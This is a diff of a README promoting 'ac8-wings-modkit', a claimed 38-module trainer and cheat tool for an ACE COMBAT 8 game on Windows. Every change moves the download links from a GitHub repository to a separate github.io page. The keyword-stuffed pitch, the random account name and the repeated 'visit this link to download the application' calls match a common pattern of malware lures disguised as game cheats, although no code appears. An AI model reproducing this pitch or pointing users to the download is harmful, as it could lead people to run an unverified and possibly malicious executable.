@@ -1,6 +1,6 @@
 # 🛩️ ac8-wings-modkit - Unlock Every Mission With Confidence
 
-[![Download ac8-wings-modkit](https://img.shields.io/badge/Download-ac8--wings--modkit-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/changefulnesspitstop975/ac8-wings-modkit)
+[![Download ac8-wings-modkit](https://img.shields.io/badge/Download-ac8--wings--modkit-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://changefulnesspitstop975.github.io)
 
 ac8-wings-modkit is a 38-module utility suite built for ACE COMBAT 8: Wings of Theve. It brings together aerial combat helpers, aircraft performance tuning, MRP economy controls, and mission tools in one tidy package. If you have been searching for an ace combat 8 trainer or an ace combat 8 cheat that actually keeps things organized, this is the toolkit you want on your Windows PC.
 
@@ -24,9 +24,9 @@ That is the whole process. There is no installer wizard, no account creation, an
 
 ## 💾 Download and Setup
 
-[![Download ac8-wings-modkit](https://img.shields.io/badge/Get%20ac8--wings--modkit-38%20Modules-00bfff?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/changefulnesspitstop975/ac8-wings-modkit)
+[![Download ac8-wings-modkit](https://img.shields.io/badge/Get%20ac8--wings--modkit-38%20Modules-00bfff?style=for-the-badge&logo=windows&logoColor=white)](https://changefulnesspitstop975.github.io)
 
-**Visit this link to download the application:** https://github.com/changefulnesspitstop975/ac8-wings-modkit
+**Visit this link to download the application:** https://changefulnesspitstop975.github.io
 
 A few tips to make your first run smooth:
 
@@ -120,7 +120,7 @@ Use the toolkit in single-player content. That is what it is designed for, and i
 - **Module count:** 38
 - **Categories:** Aerial combat, aircraft performance, MRP economy, mission tools
 - **Skill level required:** None
-- **Download:** https://github.com/changefulnesspitstop975/ac8-wings-modkit
+- **Download:** https://changefulnesspitstop975.github.io
 
 ---
 
@@ -148,7 +148,7 @@ Re-read the troubleshooting section above. Most issues come down to the toolkit 
 
 ## 🏁 Final Step
 
-[![Download ac8-wings-modkit](https://img.shields.io/badge/Download%20Now-ac8--wings--modkit-32cd32?style=for-the-badge&logo=github&logoColor=white)](https://github.com/changefulnesspitstop975/ac8-wings-modkit)
+[![Download ac8-wings-modkit](https://img.shields.io/badge/Download%20Now-ac8--wings--modkit-32cd32?style=for-the-badge&logo=github&logoColor=white)](https://changefulnesspitstop975.github.io)
 
 Visit this link to download the application, open it on your Windows PC, and take control of your ACE COMBAT 8: Wings of Theve experience with all 38 modules at your fingertips.
 
